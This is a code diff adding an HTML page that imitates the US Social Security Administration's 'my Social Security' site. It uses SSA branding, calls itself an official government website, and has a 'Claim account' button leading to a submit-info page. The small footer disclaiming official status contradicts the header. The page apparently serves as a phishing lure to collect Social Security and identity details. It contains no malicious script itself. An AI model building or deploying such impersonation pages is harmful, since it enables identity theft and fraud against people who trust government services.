@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<!-- Favicon -->
+  <link rel="icon" href="ssa.png" type="image/x-icon">
+  <link rel="icon" type="image/png" sizes="32x32" href="ssa.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="ssa.png">
+<title>my Social Security | SSA</title>
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#f7fbff;
+    --card:#ffffff;
+    --accent:#0b6eff;     /* brand accent — change to your brand */
+    --muted:#6b7280;
+    --maxw:1100px;
+    --radius:12px;
+    font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:#111;}
+  .site{max-width:var(--maxw);margin:24px auto;padding:20px}
+  /* header */
+  header{display:flex;align-items:center;justify-content:space-between;gap:16px}
+  .brand{display:flex;align-items:center;gap:12px}
+  .logo{width:48px;height:48px;border-radius:8px;background:linear-gradient(135deg,var(--accent),#28c2ff);display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
+  .title{font-size:1.05rem;font-weight:700}
+  nav{display:flex;gap:12px;align-items:center}
+  .lang{font-size:.95rem;color:var(--muted);border:1px solid #e6eefc;padding:6px 10px;border-radius:8px;background:white}
+  /* hero */
+  .hero{display:flex;flex-wrap:wrap;gap:20px;align-items:center;margin:22px 0}
+  .hero-left{flex:1;min-width:260px}
+  .kicker{display:inline-block;background:#e8f0ff;color:var(--accent);padding:6px 10px;border-radius:999px;font-weight:600;font-size:.85rem}
+  h1{margin:10px 0 8px;font-size:1.6rem;line-height:1.05}
+  p.lead{color:var(--muted);margin:0 0 8px}
+  .cta-row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
+  .btn{padding:10px 14px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
+  .btn-primary{background:var(--accent);color:white}
+  .btn-ghost{background:transparent;border:1px solid #d7e7ff;color:var(--accent)}
+  .hero-right{width:320px;min-width:260px}
+  .info-card{background:linear-gradient(180deg,#fff,#fbfdff);border-radius:12px;padding:14px;box-shadow:0 6px 20px rgba(15,30,60,0.06)}
+  /* action grid */
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin:18px 0}
+  .action{background:var(--card);padding:16px;border-radius:12px;border:1px solid #eef6ff;display:flex;gap:12px;align-items:flex-start}
+  .action .icon{width:52px;height:52;border-radius:10px;background:#f1f8ff;display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--accent)}
+  .action h3{margin:0;font-size:1rem}
+  .action p{margin:6px 0 0;color:var(--muted);font-size:.92rem}
+  .action a{margin-top:8px;display:inline-block;font-weight:600;color:var(--accent);text-decoration:none}
+  /* support row */
+  .support{display:flex;flex-wrap:wrap;gap:10px;margin:18px 0;color:var(--muted)}
+  .support a{color:var(--muted);text-decoration:none;border-radius:8px;padding:8px 10px;background:#ffffff;border:1px solid #f3f7fb}
+  /* footer */
+  footer{margin-top:28px;padding-top:18px;border-top:1px solid #e8f1fb;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;color:var(--muted)}
+  .small{font-size:.88rem}
+  @media (max-width:720px){
+    .hero{flex-direction:column}
+    .hero-right{width:100%}
+  }
+</style>
+</head>
+<body>
+  <div class="site" role="main">
+    <header>
+      <div class="brand" aria-label="ssa.gov">
+        <div class="logo" style="background:none;">
+		<img src="ssalogo.jpg" alt="ssa logo" style="width:48px;height:48px;border-radius:8px;object-fit:contain;">
+		</div>
+        <div>
+          <div class="title">Social Security</div>
+          <div class="small" style="color:var(--muted)">An official website of the United States government</div>
+        </div>
+      </div>
+
+      <nav aria-label="Primary navigation">
+        <div class="lang" role="button" aria-pressed="false">English ▼</div>
+      </nav>
+    </header>
+
+    <section class="hero" aria-labelledby="pageTitle">
+      <div class="hero-left">
+        <span class="kicker">Learn about changes we’re making to your personal my Social Security account</span>
+        <h1 id="pageTitle">Manage your identification and card tasks</h1>
+        <p class="lead">Go Digital! Create your personal my Social Security account today, quickly replace a card, request a new number, or make adjustments to your information linked to your profile — all from your account.</p>
+        <div class="cta-row">
+          <button class="btn btn-primary" onclick="location.href='submit-info.html'">Claim account</button>
+          <button class="btn btn-ghost" onclick="location.href='#help'">Help & FAQs</button>
+        </div>
+      </div>
+
+      <div class="hero-right">
+        <div class="info-card" aria-hidden="false">
+          <strong>Need help?</strong>
+          <p class="small" style="margin-top:8px;color:var(--muted)">Call our support line or visit a local office. Office hours: Mon–Fri, 9am–5pm.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- quick action grid -->
+    <section class="grid" aria-label="Quick actions">
+      <div class="action" id="replace">
+        <div class="icon">R</div>
+        <div>
+          <h3>Replace Card</h3>
+          <p>Report a lost, stolen, or damaged card and request a replacement. You will be guided through required documents.</p>
+          <a href="#">Start replace process →</a>
+        </div>
+      </div>
+
+      <div class="action" id="request">
+        <div class="icon">N</div>
+        <div>
+          <h3>Request New Number</h3>
+          <p>Apply for a new identifier if you do not already have one, or if special circumstances apply.</p>
+          <a href="#">Begin application →</a>
+        </div>
+      </div>
+
+      <div class="action" id="report">
+        <div class="icon">S</div>
+        <div>
+          <h3>Report Suspected Fraud</h3>
+          <p>Suspect identity theft? Learn how to report issues and protect your account.</p>
+          <a href="#">Report now →</a>
+        </div>
+      </div>
+
+      <div class="action" id="update">
+        <div class="icon">P</div>
+        <div>
+          <h3>Update Personal Info</h3>
+          <p>Tell us if your name, address, or other personal information changes so records stay correct.</p>
+          <a href="#">Update record →</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- support and resources -->
+    <div class="support" aria-label="Support links">
+      <a href="#" id="findOffice">Find an office</a>
+      <a href="#" id="forms">Forms</a>
+      <a href="#" id="publications">Publications</a>
+      <a href="#" id="contact">Contact us</a>
+    </div>
+
+    <footer>
+      <div class="small">© <span id="year"></span> MyOrg — Not an official government site</div>
+      <div class="small">Accessibility • Privacy • Terms</div>
+    </footer>
+  </div>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+  // small helper for demo links (remove in production)
+  document.querySelectorAll('a[href="#"]').forEach(a=>{
+    a.addEventListener('click', e=>{ e.preventDefault(); alert('Replace this link with your app route or page.'); })
+  });
+</script>
+</body>
+</html>
